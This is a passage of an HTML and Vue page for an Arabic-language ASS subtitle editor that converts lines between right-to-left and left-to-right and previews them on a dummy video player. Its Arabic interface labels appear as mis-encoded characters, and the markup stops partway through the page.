<!DOCTYPE html>
<html lang="ar" dir="rtl">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>ŸÖÿ≠ÿ±ÿ± ÿ™ÿ≠ŸàŸäŸÑ RTL/LTR</title>
        <link rel="manifest" href="./manifest.json">
        <meta name="theme-color" content="#4f46e5">
        <meta name="mobile-web-app-capable" content="yes">
        <meta name="apple-mobile-web-app-capable" content="yes">
        <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
        <link rel="icon" type="image/svg+xml" href="./icon-192.svg">
        <link rel="apple-touch-icon" href="./icon-192.svg">
        <script>
            (function () {
                try {
                    const savedTheme = localStorage.getItem('rtl-editor-theme');
                    const isDark = savedTheme
                        ? savedTheme === 'dark'
                        : window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches;
                    document.documentElement.classList.toggle('dark', !!isDark);
                    document.documentElement.style.colorScheme = isDark ? 'dark' : 'light';
                } catch (_) {}
            })();
        </script>
        <style>
            html, body {
                background-color: #f9fafb;
                color: #111827;
            }
            html.dark, html.dark body {
                background-color: #111827;
                color: #f9fafb;
            }
        </style>
        <script src="https://cdn.tailwindcss.com"></script>
        <script>
            tailwind.config = {
                darkMode: 'class',
                theme: {
                    extend: {
                        colors: {
                            primary: {
                                light: 'rgb(37, 99, 235)',
                                dark: 'rgb(59, 130, 246)'
                            },
                            success: {
                                light: 'rgb(22, 163, 74)',
                                dark: 'rgb(34, 197, 94)'
                            },
                            rtl: {
                                light: 'rgb(22, 163, 74)', // Green for RTL/Convert
                                dark: 'rgb(34, 197, 94)'
                            },
                            ltr: {
                                light: 'rgb(239, 68, 68)', // Red for LTR/Unconverted
                                dark: 'rgb(248, 113, 113)'
                            },
                            error: {
                                light: 'rgb(239, 68, 68)',
                                dark: 'rgb(248, 113, 113)'
                            },
                            warning: {
                                light: 'rgb(245, 158, 11)',
                                dark: 'rgb(251, 191, 36)'
                            }
                        },
                        fontFamily: {
                            sans: ['Tajawal', 'ui-sans-serif', 'system-ui', '-apple-system', 'BlinkMacSystemFont', 'Segoe UI', 'Roboto', 'Helvetica Neue', 'Arial', 'sans-serif'],
                        }
                    }
                }
            }
        </script>
        <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@400;500;700&display=swap" rel="stylesheet">
        <script src="https://cdn.jsdelivr.net/npm/vue@3/dist/vue.global.js"></script>
        <style>
            [v-cloak] {
                display: none !important;
            }

            .transition-theme {
                transition: background-color 0.3s ease, color 0.3s ease, border-color 0.3s ease;
            }

            .touch-target {
                min-width: 44px;
                min-height: 44px;
            }

            .preview-box {
                min-height: 80px;
            }

            .rtl {
                direction: rtl;
                text-align: right;
                unicode-bidi: plaintext;
            }

            .ltr {
                direction: ltr;
                text-align: left;
                unicode-bidi: plaintext;
            }

            .truncate-left {
                overflow: hidden;
                text-overflow: ellipsis;
                direction: ltr;
            }

            .modal-overlay {
                background-color: rgba(0, 0, 0, 0.5);
            }

            .modal-content {
                max-height: 80vh;
                overflow-y: auto;
            }

            /* Custom Scrollbar for line selector */
            .line-selector::-webkit-scrollbar {
                width: 8px;
            }

            .line-selector::-webkit-scrollbar-track {
                background: transparent;
            }

            .line-selector::-webkit-scrollbar-thumb {
                background-color: rgba(156, 163, 175, 0.5);
                border-radius: 4px;
            }
        </style>
    </head>
    <body class="bg-gray-50 dark:bg-gray-900 text-gray-900 dark:text-gray-100 transition-theme font-sans">
        <div id="app" v-cloak class="min-h-screen flex flex-col">
            <!-- Header -->
            <header class="sticky top-0 z-50 bg-white dark:bg-gray-800 shadow-sm transition-theme">
                <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-3">
                    <div class="flex items-center justify-between gap-4">
                        <!-- Logo & Title -->
                        <div class="flex items-center gap-3">
                            <img src="./icon-192.svg" alt="Logo" class="w-11 h-11 cursor-pointer"
                                @dblclick="showDebugButton = !showDebugButton">
                            <h1 class="text-lg sm:text-xl font-bold text-primary-light dark:text-white truncate">ŸÖÿ≠ÿ±ÿ± ÿ™ÿ≠ŸàŸäŸÑ
                                RTL/LTR</h1>
                            <span class="w-9 h-9 sm:w-10 sm:h-10 bg-[#00d4aa]/10 text-[#00d4aa] dark:bg-[#00d4aa]/10 dark:text-[#00d4aa] rounded-md flex items-center justify-center text-[10px] sm:text-xs font-bold">ÿ™ÿ¨ÿ±Ÿäÿ®Ÿä</span>
                        </div>

                        <!-- Desktop Menu -->
                        <div class="hidden md:flex items-center gap-2">
                            <button v-if="assFile" @click="showScriptInfoModal = true"
                                class="touch-target px-3 py-2 bg-gray-100 dark:bg-gray-700 text-gray-700 dark:text-gray-300 rounded-lg hover:bg-gray-200 dark:hover:bg-gray-600 transition-theme text-sm flex items-center gap-2">
                                <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5" viewBox="0 0 20 20"
                                    fill="currentColor">
                                    <path fill-rule="evenodd"
                                        d="M18 10a8 8 0 11-16 0 8 8 0 0116 0zm-7-4a1 1 0 11-2 0 1 1 0 012 0zM9 9a1 1 0 000 2v3a1 1 0 001 1h1a1 1 0 100-2v-3a1 1 0 00-1-1H9z"
                                        clip-rule="evenodd" />
                                </svg>
                                ŸÖÿπŸÑŸàŸÖÿßÿ™ ŸÖŸÑŸÅ ÿßŸÑÿ™ÿ±ÿ¨ŸÖÿ©
                            </button>
                            <button v-if="showInstallButton" @click="installPWA"
                                class="touch-target px-3 py-2 bg-indigo-500 text-white rounded-lg hover:bg-indigo-600 transition-theme flex items-center gap-2 text-sm">
                                <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5" viewBox="0 0 20 20" fill="currentColor">
                                    <path fill-rule="evenodd" d="M3 14a1 1 0 011 1v1h12v-1a1 1 0 112 0v1a2 2 0 01-2 2H4a2 2 0 01-2-2v-1a1 1 0 011-1zm7-12a1 1 0 011 1v7.586l2.293-2.293a1 1 0 111.414 1.414l-4 4a1 1 0 01-1.414 0l-4-4a1 1 0 111.414-1.414L9 10.586V3a1 1 0 011-1z" clip-rule="evenodd"/>
                                </svg>
                                ÿ™ÿ´ÿ®Ÿäÿ™ ÿßŸÑŸÖÿ≠ÿ±ÿ±
                            </button>
                            <button v-if="assFile" @click="resetFile"
                                class="touch-target px-3 py-2 bg-gray-200 dark:bg-gray-700 text-gray-700 dark:text-gray-300 rounded-lg hover:opacity-90 transition-theme text-sm flex items-center gap-2">
                                <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5" viewBox="0 0 20 20"
                                    fill="currentColor">
                                    <path fill-rule="evenodd"
                                        d="M10 18a8 8 0 100-16 8 8 0 000 16zm1-11a1 1 0 10-2 0v2H7a1 1 0 100 2h2v2a1 1 0 102 0v-2h2a1 1 0 100-2h-2V7z"
                                        clip-rule="evenodd" />
                                </svg>
                                ŸÖŸÑŸÅ ÿ¨ÿØŸäÿØ
                            </button>
                            <!-- <button @click="toggleTheme" class="touch-target p-2 rounded-lg bg-gray-100 dark:bg-gray-700 hover:bg-gray-200 dark:hover:bg-gray-600 transition-theme" aria-label="ÿ™ÿ®ÿØŸäŸÑ ÿßŸÑŸÖÿ∏Ÿáÿ±">
                                <span v-if="isDarkMode" class="text-xl">‚òÄÔ∏è</span>
                                <span v-else class="text-xl">üåô</span>
                            </button> -->
                        </div>

                        <!-- Mobile Menu Button -->
                        <div class="flex md:hidden items-center gap-2">
                            <!-- <button @click="toggleTheme" class="touch-target p-2 rounded-lg bg-gray-100 dark:bg-gray-700 hover:bg-gray-200 dark:hover:bg-gray-600 transition-theme">
                                <span v-if="isDarkMode" class="text-xl">‚òÄÔ∏è</span>
                                <span v-else class="text-xl">üåô</span>
                            </button> -->
                            <button @click="mobileMenuOpen = !mobileMenuOpen"
                                class="touch-target p-2 rounded-lg bg-gray-100 dark:bg-gray-700 text-gray-700 dark:text-gray-300 flex items-center justify-center">
                                <svg xmlns="http://www.w3.org/2000/svg" class="h-6 w-6" fill="none" viewBox="0 0 24 24"
                                    stroke="currentColor">
                                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
                                        d="M4 6h16M4 12h16M4 18h16" />
                                </svg>
                            </button>
                        </div>
                    </div>

                    <!-- Mobile Dropdown -->
                    <div v-if="mobileMenuOpen"
                        class="md:hidden mt-4 pb-2 border-t border-gray-200 dark:border-gray-700 pt-4 space-y-2">
                        <button v-if="assFile" @click="resetFile(); mobileMenuOpen = false"
                            class="w-full text-right px-4 py-2 bg-gray-200 dark:bg-gray-700 text-gray-700 dark:text-gray-300 rounded-lg hover:opacity-90 transition-theme flex items-center gap-2 justify-center">
                            <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5" viewBox="0 0 20 20" fill="currentColor">
                                <path fill-rule="evenodd"
                                    d="M10 18a8 8 0 100-16 8 8 0 000 16zm1-11a1 1 0 10-2 0v2H7a1 1 0 100 2h2v2a1 1 0 102 0v-2h2a1 1 0 100-2h-2V7z"
                                    clip-rule="evenodd" />
                            </svg>
                            ŸÖŸÑŸÅ ÿ¨ÿØŸäÿØ
                        </button>
                        <button v-if="assFile" @click="showScriptInfoModal = true; mobileMenuOpen = false"
                            class="w-full text-right px-4 py-2 bg-gray-50 dark:bg-gray-700 text-gray-700 dark:text-gray-300 rounded-lg hover:bg-gray-100 dark:hover:bg-gray-600 transition-theme flex items-center gap-2 justify-center">
                            <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5" viewBox="0 0 20 20" fill="currentColor">
                                <path fill-rule="evenodd"
                                    d="M18 10a8 8 0 11-16 0 8 8 0 0116 0zm-7-4a1 1 0 11-2 0 1 1 0 012 0zM9 9a1 1 0 000 2v3a1 1 0 001 1h1a1 1 0 100-2v-3a1 1 0 00-1-1H9z"
                                    clip-rule="evenodd" />
                            </svg>
                            ŸÖÿπŸÑŸàŸÖÿßÿ™ ŸÖŸÑŸÅ ÿßŸÑÿ™ÿ±ÿ¨ŸÖÿ©
                        </button>
                        <button v-if="showInstallButton" @click="installPWA(); mobileMenuOpen = false"
                            class="w-full text-right px-4 py-2 bg-indigo-500 text-white rounded-lg hover:bg-indigo-600 transition-theme flex items-center gap-2 justify-center">
                            <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5" viewBox="0 0 20 20" fill="currentColor">
                                <path fill-rule="evenodd" d="M3 14a1 1 0 011 1v1h12v-1a1 1 0 112 0v1a2 2 0 01-2 2H4a2 2 0 01-2-2v-1a1 1 0 011-1zm7-12a1 1 0 011 1v7.586l2.293-2.293a1 1 0 111.414 1.414l-4 4a1 1 0 01-1.414 0l-4-4a1 1 0 111.414-1.414L9 10.586V3a1 1 0 011-1z" clip-rule="evenodd"/>
                            </svg>
                            ÿ™ÿ´ÿ®Ÿäÿ™ ÿßŸÑŸÖÿ≠ÿ±ÿ±
                        </button>
                    </div>
                </div>
            </header>

            <main :class="[
                'flex-1 w-full',
                assFile && viewMode === 'dummy-video'
                    ? 'max-w-7xl mx-auto px-3 sm:px-6 lg:px-8 py-4'
                    : 'max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-6'
            ]">
                <div v-if="!assFile" class="upload-section">
                    <div @dragover.prevent="isDragging = true" @dragleave.prevent="isDragging = false"
                        @drop.prevent="handleDrop" @click="$refs.fileInput.click()" :class="[
                            'border-2 border-dashed rounded-2xl p-12 text-center cursor-pointer transition-all',
                            isDragging 
                                ? 'border-primary-light dark:border-primary-dark bg-blue-50 dark:bg-blue-900/20' 
                                : 'border-gray-300 dark:border-gray-600 hover:border-primary-light dark:hover:border-primary-dark'
                        ]">
                        <div class="flex flex-col items-center gap-4">
                            <div class="text-6xl">üìÅ</div>
                            <div>
                                <p class="text-lg font-medium">ÿßŸÜŸÇÿ± ŸÑŸÑÿßÿ≥ÿ™ÿπÿ±ÿßÿ∂</p>
                                <p class="text-gray-500 dark:text-gray-400 mt-1">ÿ£Ÿà ÿßÿ≥ÿ≠ÿ® ŸÖŸÑŸÅ ASS Ÿàÿ£ŸÅŸÑÿ™Ÿá ŸáŸÜÿß</p>
                            </div>
                        </div>
                        <input ref="fileInput" type="file" accept=".ass" @change="handleFileUpload" class="hidden">
                    </div>
                </div>

                <div v-else class="editor-section">
                    <div v-if="errorLog.length > 0"
                        class="mb-4 bg-error-light/10 dark:bg-error-dark/10 border border-error-light dark:border-error-dark rounded-xl p-4">
                        <div class="flex items-center justify-between mb-2">
                            <h3 class="text-sm font-semibold text-error-light dark:text-error-dark">ÿ≥ÿ¨ŸÑ ÿßŸÑÿ£ÿÆÿ∑ÿßÿ° ({{
                                errorLog.length }})</h3>
                            <button @click="clearErrorLog"
                                class="text-xs text-error-light dark:text-error-dark hover:underline">ŸÖÿ≥ÿ≠</button>
                        </div>
                        <div class="max-h-32 overflow-y-auto space-y-1">
                            <div v-for="(error, index) in errorLog" :key="index"
                                class="text-xs text-error-light dark:text-error-dark">
                                {{ error }}
                            </div>
                        </div>
                    </div>

                    <div class="mb-6 flex flex-col gap-4">
                        <div class="flex flex-col sm:flex-row gap-4 items-end sm:items-center">
                            <div class="flex-1">
                                <h2 dir="ltr" class="text-lg font-semibold text-left">{{ fileName }}</h2>
                            </div>
                        </div>

                        <div
                            class="bg-white dark:bg-gray-800 rounded-xl p-4 shadow-sm border border-gray-200 dark:border-gray-700">
                            <h3 class="text-sm font-semibold mb-3 text-gray-700 dark:text-gray-300">ÿ•ÿ≠ÿµÿßÿ¶Ÿäÿßÿ™ ÿßŸÑŸÖŸÑŸÅ</h3>
                            <div class="grid grid-cols-3 sm:grid-cols-6 lg:grid-cols-6 gap-4">
                                <div @click="showLinesModal('all')"
                                    class="text-center cursor-pointer hover:bg-gray-50 dark:hover:bg-gray-700 rounded-lg p-2 transition-theme">
                                    <div class="text-2xl font-bold text-primary-light dark:text-primary-dark">{{ totalLines
                                        }}</div>
                                    <div class="text-xs text-gray-500 dark:text-gray-400">ÿ•ÿ¨ŸÖÿßŸÑŸä ÿßŸÑÿ£ÿ≥ÿ∑ÿ±</div>
                                </div>
                                <div @click="showLinesModal('ltr')"
                                    class="text-center cursor-pointer hover:bg-gray-50 dark:hover:bg-gray-700 rounded-lg p-2 transition-theme">
                                    <div class="text-2xl font-bold text-ltr-light dark:text-ltr-dark">{{ ltrCount }}</div>
                                    <div class="text-xs text-gray-500 dark:text-gray-400">LTR</div>
                                </div>
                                <div @click="showLinesModal('rtl')"
                                    class="text-center cursor-pointer hover:bg-gray-50 dark:hover:bg-gray-700 rounded-lg p-2 transition-theme">
                                    <div class="text-2xl font-bold text-rtl-light dark:text-rtl-dark">{{ rtlCount }}</div>
                                    <div class="text-xs text-gray-500 dark:text-gray-400">RTL</div>
                                </div>

                                <div @click="showFontsModal = true"
                                    class="text-center cursor-pointer hover:bg-gray-50 dark:hover:bg-gray-700 rounded-lg p-2 transition-theme">
                                    <div class="text-2xl font-bold text-primary-light dark:text-primary-dark">{{ fontCount
                                        }}</div>
                                    <div class="text-xs text-gray-500 dark:text-gray-400">ÿßŸÑÿÆÿ∑Ÿàÿ∑ ŸàÿßŸÑÿ£ŸÜŸÖÿßÿ∑</div>
                                </div>
                                <div v-if="showDebugButton" @click="openDebugModal"
                                    class="text-center cursor-pointer hover:bg-gray-50 dark:hover:bg-gray-700 rounded-lg p-2 transition-theme">
                                    <div class="text-2xl font-bold text-gray-500">?</div>
                                    <div class="text-xs text-gray-500 dark:text-gray-400">ÿ™ÿµÿ≠Ÿäÿ≠</div>
                                </div>
                            </div>
                            <div class="mt-3 text-center">
                                <div class="text-lg font-bold text-gray-600 dark:text-gray-400" dir="ltr">{{ fileSize }}
                                </div>
                                <div class="text-xs text-gray-500 dark:text-gray-400">ÿ≠ÿ¨ŸÖ ÿßŸÑŸÖŸÑŸÅ</div>
                            </div>
                        </div>

                        <div
                            class="bg-white dark:bg-gray-800 rounded-xl p-4 shadow-sm border border-gray-200 dark:border-gray-700">
                            <div class="flex items-center justify-between mb-2">
                                <h3 class="text-sm font-semibold text-gray-700 dark:text-gray-300">ÿ™ŸÇÿØŸÖ ÿßŸÑÿ™ÿ≠ŸàŸäŸÑ</h3>
                                <span class="text-sm text-gray-500 dark:text-gray-400">{{ conversionPercentage }}%</span>
                            </div>
                            <div class="w-full bg-gray-200 dark:bg-gray-700 rounded-full h-3">
                                <div class="bg-rtl-light dark:bg-rtl-dark h-3 rounded-full transition-all duration-300"
                                    :style="{ width: conversionPercentage + '%' }"></div>
                            </div>
                            <div class="mt-2 text-xs text-gray-500 dark:text-gray-400">
                               ÿ™ŸÖ ÿ™ÿ≠ŸàŸäŸÑ {{ rtlCount }} ŸÖŸÜ {{ totalLines }} ÿ≥ÿ∑ÿ± ÿ•ŸÑŸâ RTL
                            </div>
                        </div>
                    </div>

                    <div v-if="lines.length === 0" class="text-center py-12 text-gray-500 dark:text-gray-400">
                        <p class="text-lg">ŸÑŸÖ Ÿäÿ™ŸÖ ÿßŸÑÿπÿ´Ÿàÿ± ÿπŸÑŸâ ÿ£ÿ≥ÿ∑ÿ± ÿ≠Ÿàÿßÿ± ŸÅŸä ÿßŸÑŸÖŸÑŸÅ</p>
                    </div>

                    <div v-else class="space-y-6">
                        <!-- View Mode Toggle -->
                        <div class="flex justify-center bg-gray-100 dark:bg-gray-800 p-1 rounded-xl w-fit mx-auto">
                            <button @click="viewMode = 'cards'" @dblclick="handleDummyVideoUnlockSecondStep"
                                class="px-4 py-2 rounded-lg text-sm font-medium transition-all duration-200 flex items-center gap-2"
                                :class="viewMode === 'cards' ? 'bg-white dark:bg-gray-700 text-primary-light dark:text-primary-dark shadow-sm' : 'text-gray-500 dark:text-gray-400 hover:text-gray-700 dark:hover:text-gray-300'">
                                <svg xmlns="http://www.w3.org/2000/svg" class="h-4 w-4" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 11H5m14 0a2 2 0 012 2v6a2 2 0 01-2 2H5a2 2 0 01-2-2v-6a2 2 0 012-2m14 0V9a2 2 0 00-2-2M5 11V9a2 2 0 012-2m0 0V5a2 2 0 012-2h6a2 2 0 012 2v2M7 7h10" />
                                </svg>
                                ÿ®ÿ∑ÿßŸÇÿßÿ™
                            </button>
                            <button v-if="showDummyVideoToggle || viewMode === 'dummy-video'" @click="viewMode = 'dummy-video'" 
                                class="px-4 py-2 rounded-lg text-sm font-medium transition-all duration-200 flex items-center gap-2"
                                :class="viewMode === 'dummy-video' ? 'bg-white dark:bg-gray-700 text-primary-light dark:text-primary-dark shadow-sm' : 'text-gray-500 dark:text-gray-400 hover:text-gray-700 dark:hover:text-gray-300'">
                                <svg xmlns="http://www.w3.org/2000/svg" class="h-4 w-4" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M14.752 11.168l-3.197-2.132A1 1 0 0010 9.87v4.263a1 1 0 001.555.832l3.197-2.132a1 1 0 000-1.664z" />
                                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M21 12a9 9 0 11-18 0 9 9 0 0118 0z" />
                                </svg>
                                ŸÅŸäÿØŸäŸà ÿ™ÿ¨ÿ±Ÿäÿ®Ÿä
                            </button>
                        </div>

                        <!-- Dummy Video Player -->
                        <div v-if="viewMode === 'dummy-video'" class="space-y-4">
                            <div class="bg-white dark:bg-gray-800 rounded-2xl shadow-sm border border-gray-200 dark:border-gray-700 overflow-hidden">
                                <div class="bg-black">
                                    <div ref="videoContainer" class="relative w-full flex items-center justify-center overflow-hidden" 
                                         :style="{ backgroundColor: dummyVideo.color, aspectRatio: (dummyVideo.width > 0 && dummyVideo.height > 0) ? (dummyVideo.width + ' / ' + dummyVideo.height) : '16 / 9' }">
                                <div class="absolute inset-0 pointer-events-none overflow-hidden">
                                    <canvas v-if="useLibassWasm" ref="libassCanvas" class="absolute inset-0 w-full h-full pointer-events-none"></canvas>
                                    <div v-else>
                                        <canvas v-if="libassPartsEnabled" ref="libassPartsCanvas" class="absolute inset-0 w-full h-full pointer-events-none"></canvas>
                                        <svg v-if="!libassPartsEnabled" class="absolute inset-0 w-full h-full pointer-events-none"
                                             :width="dummyVideo.containerWidth" :height="dummyVideo.containerHeight">
                                            <defs>
                                                <clipPath v-for="entry in renderedActiveSubtitles" v-if="entry.clip && !entry.clip.invert"
                                                    :key="'ass-clip-def-' + entry.idx" :id="getLineClipPathId(entry.idx)" clipPathUnits="userSpaceOnUse">
                                                    <rect v-if="entry.clip.kind === 'rect'" :x="entry.clip.x" :y="entry.clip.y" :width="entry.clip.w" :height="entry.clip.h"></rect>
                                                    <path v-else-if="entry.clip.kind === 'path'" :d="entry.clip.d"></path>
                                                </clipPath>
                                                <mask v-for="entry in renderedActiveSubtitles" v-if="entry.clip && entry.clip.invert"
                                                    :key="'ass-clip-mask-' + entry.idx" :id="getLineClipMaskId(entry.idx)" maskUnits="userSpaceOnUse">
                                                    <rect x="0" y="0" :width="dummyVideo.containerWidth" :height="dummyVideo.containerHeight" fill="white"></rect>
                                                    <rect v-if="entry.clip.kind === 'rect'" :x="entry.clip.x" :y="entry.clip.y" :width="entry.clip.w" :height="entry.clip.h" fill="black"></rect>
                                                    <path v-else-if="entry.clip.kind === 'path'" :d="entry.clip.d" fill="black"></path>
                                                </mask>
                                            </defs>
                                        </svg>
                                        <div v-for="entry in renderedActiveSubtitles" :key="entry.idx" 
                                             class="select-none transition-all duration-100"
                                             :style="entry.style">
                                            <template v-for="(part, pIdx) in entry.parts" :key="pIdx">
                                                <span v-if="!part.kind || part.kind === 'text'" :style="part.style">{{ part.text }}</span>
                                                <svg v-else-if="part.kind === 'drawing'" :style="part.style" width="1" height="1" viewBox="0 0 1 1">
                                                    <path :d="part.d" :fill="part.fill" :stroke="part.stroke" :stroke-width="part.strokeWidth" fill-rule="evenodd"></path>
                                                </svg>
                                            </template>
                                        </div>
                                    </div>
                                </div>
                                    </div>
                                </div>

                                <div class="bg-white dark:bg-gray-800 p-3 border-t border-gray-200 dark:border-gray-700">
                                    <div class="flex flex-wrap items-center gap-3 mb-3">
                                        <button @click="togglePlayback" class="text-primary-light dark:text-primary-dark hover:opacity-80 transition-opacity">
                                            <svg v-if="dummyVideo.isPlaying" xmlns="http://www.w3.org/2000/svg" class="h-8 w-8" viewBox="0 0 20 20" fill="currentColor">
                                                <path fill-rule="evenodd" d="M18 10a8 8 0 11-16 0 8 8 0 0116 0zM7 8a1 1 0 012 0v4a1 1 0 11-2 0V8zm5-1a1 1 0 00-1 1v4a1 1 0 102 0V8a1 1 0 00-1-1z" clip-rule="evenodd" />
                                            </svg>
                                            <svg v-else xmlns="http://www.w3.org/2000/svg" class="h-8 w-8" viewBox="0 0 20 20" fill="currentColor">
                                                <path fill-rule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zM9.555 7.168A1 1 0 008 8v4a1 1 0 001.555.832l3-2a1 1 0 000-1.664l-3-2z" clip-rule="evenodd" />
                                            </svg>
                                        </button>
                                        
                                        <div class="text-sm font-mono font-bold text-gray-600 dark:text-gray-300 whitespace-nowrap" dir="ltr">
                                            {{ formattedCurrentTime }} / {{ formattedDuration }}
                                        </div>

                                        <button @click="openDummyVideoOptions" class="ml-auto p-2 text-gray-500 hover:text-gray-700 dark:text-gray-400 dark:hover:text-gray-200 rounded-full hover:bg-gray-100 dark:hover:bg-gray-700 transition-colors" title="ÿ•ÿπÿØÿßÿØÿßÿ™ ÿßŸÑŸÅŸäÿØŸäŸà">
                                            <svg xmlns="http://www.w3.org/2000/svg" class="h-6 w-6" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10.325 4.317c.426-1.756 2.924-1.756 3.35 0a1.724 1.724 0 002.573 1.066c1.543-.94 3.31.826 2.37 2.37a1.724 1.724 0 001.065 2.572c1.756.426 1.756 2.924 0 3.35a1.724 1.724 0 00-1.066 2.573c.94 1.543-.826 3.31-2.37 2.37a1.724 1.724 0 00-2.572 1.065c-.426 1.756-2.924 1.756-3.35 0a1.724 1.724 0 00-2.573-1.066c-1.543.94-3.31-.826-2.37-2.37a1.724 1.724 0 00-1.065-2.572c-1.756-.426-1.756-2.924 0-3.35a1.724 1.724 0 001.066-2.573c-.94-1.543.826-3.31 2.37-2.37.996.608 2.296.07 2.572-1.065z" />
                                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 12a3 3 0 11-6 0 3 3 0 016 0z" />
                                            </svg>
                                        </button>
                                    </div>

                                    <input type="range" min="0" :max="videoDuration" step="10" 
                                        :value="currentTime" @input="seek($event.target.value)"
                                        class="w-full h-2 bg-gray-200 rounded-lg appearance-none cursor-pointer dark:bg-gray-700 accent-primary-light dark:accent-primary-dark ltr mb-4">
                                    
                                    <div class="flex items-center gap-2 w-full justify-center">
                                        <button @click="goToLastLine" :disabled="!canGoToLastFiltered"
                                            class="touch-target px-3 py-2 bg-gray-100 dark:bg-gray-700 text-gray-700 dark:text-gray-300 rounded-lg hover:bg-gray-200 dark:hover:bg-gray-600 disabled:opacity-50 transition-theme"
                                            title="ÿßŸÑÿ£ÿÆŸäÿ±">
                                            <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5" viewBox="0 0 20 20"
                                                fill="currentColor">
                                                <path fill-rule="evenodd"
                                                    d="M4.293 4.293a1 1 0 011.414 0l5 5a1 1 0 010 1.414l-5 5a1 1 0 01-1.414-1.414L8.586 10 4.293 5.707a1 1 0 010-1.414zm6 0a1 1 0 011.414 0l5 5a1 1 0 010 1.414l-5 5a1 1 0 01-1.414-1.414L14.586 10l-4.293-4.293a1 1 0 010-1.414z"
                                                    clip-rule="evenodd" />
                                            </svg>
                                        </button>
                                        <button @click="goToNextLine" :disabled="!canGoToNextFiltered"
                                            class="touch-target px-3 py-2 bg-gray-100 dark:bg-gray-700 text-gray-700 dark:text-gray-300 rounded-lg hover:bg-gray-200 dark:hover:bg-gray-600 disabled:opacity-50 transition-theme"
                                            title="ÿßŸÑÿ™ÿßŸÑŸä">
                                            <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5" viewBox="0 0 20 20"
                                                fill="currentColor">
                                                <path fill-rule="evenodd"
                                                    d="M7.293 14.707a1 1 0 010-1.414L10.586 10 7.293 6.707a1 1 0 011.414-1.414l4 4a1 1 0 010 1.414l-4 4a1 1 0 01-1.414 0z"
                                                    clip-rule="evenodd" />
                                            </svg>
                                        </button>
                                        <button @click="goToPreviousLine" :disabled="!canGoToPreviousFiltered"
                                            class="touch-target px-3 py-2 bg-gray-100 dark:bg-gray-700 text-gray-700 dark:text-gray-300 rounded-lg hover:bg-gray-200 dark:hover:bg-gray-600 disabled:opacity-50 transition-theme"
                                            title="ÿßŸÑÿ≥ÿßÿ®ŸÇ">
                                            <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5" viewBox="0 0 20 20"
                                                fill="currentColor">
                                                <path fill-rule="evenodd"
                                                    d="M12.707 5.293a1 1 0 010 1.414L9.414 10l3.293 3.293a1 1 0 01-1.414 1.414l-4-4a1 1 0 010-1.414l4-4a1 1 0 011.414 0z"
                                                    clip-rule="evenodd" />
                                            </svg>
                                        </button>
                                        <button @click="goToFirstLine" :disabled="!canGoToFirstFiltered"
                                            class="touch-target px-3 py-2 bg-gray-100 dark:bg-gray-700 text-gray-700 dark:text-gray-300 rounded-lg hover:bg-gray-200 dark:hover:bg-gray-600 disabled:opacity-50 transition-theme"
                                            title="ÿßŸÑÿ£ŸàŸÑ">
                                            <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5" viewBox="0 0 20 20"
                                                fill="currentColor">
                                                <path fill-rule="evenodd"
                                                    d="M15.707 15.707a1 1 0 01-1.414 0l-5-5a1 1 0 010-1.414l5-5a1 1 0 111.414 1.414L11.414 10l4.293 4.293a1 1 0 010 1.414zm-6 0a1 1 0 01-1.414 0l-5-5a1 1 0 010-1.414l5-5a1 1 0 011.414 1.414L5.414 10l4.293 4.293a1 1 0 010 1.414z"
                                                    clip-rule="evenodd" />
                                            </svg>
                                        </button>
                                    </div>
                                </div>
                            </div>
                            
                            <!-- Line Details Box removed -->
                        </div>

                        <div class="bg-white dark:bg-gray-800 rounded-xl shadow-sm border border-gray-200 dark:border-gray-700 overflow-hidden">
                        <div class="p-4 space-y-4">
                            <div class="flex justify-center">
                                <div class="flex items-center bg-gray-100 dark:bg-gray-700 rounded-lg p-1">
                                    <button @click="filterMode = 'all'"
                                        :class="['px-3 py-1.5 text-sm rounded-md transition-all', filterMode === 'all' ? 'bg-white dark:bg-gray-600 shadow-sm text-gray-900 dark:text-gray-100' : 'text-gray-500 dark:text-gray-400 hover:text-gray-700 dark:hover:text-gray-300']">
                                        ÿßŸÑŸÉŸÑ
                                    </button>
                                    <button v-if="showRTLFilter" @click="filterMode = 'rtl'"
                                        :class="['px-3 py-1.5 text-sm rounded-md transition-all', filterMode === 'rtl' ? 'bg-white dark:bg-gray-600 shadow-sm text-rtl-light dark:text-rtl-dark font-medium' : 'text-gray-500 dark:text-gray-400 hover:text-gray-700 dark:hover:text-gray-300']">
                                        RTL
                                    </button>

                                    <button v-if="showLTRFilter" @click="filterMode = 'ltr'"
                                        :class="['px-3 py-1.5 text-sm rounded-md transition-all', filterMode === 'ltr' ? 'bg-white dark:bg-gray-600 shadow-sm text-ltr-light dark:text-ltr-dark font-medium' : 'text-gray-500 dark:text-gray-400 hover:text-gray-700 dark:hover:text-gray-300']">
                                        LTR
                                    </button>
                                </div>
                            </div>
                            <div class="flex justify-center">
                                <span class="text-sm text-gray-500 dark:text-gray-400">
                                    ÿßŸÑÿ≥ÿ∑ÿ± {{ currentIndex + 1 }} ŸÖŸÜ {{ totalLines }}
                                </span>
                            </div>
                            <div>
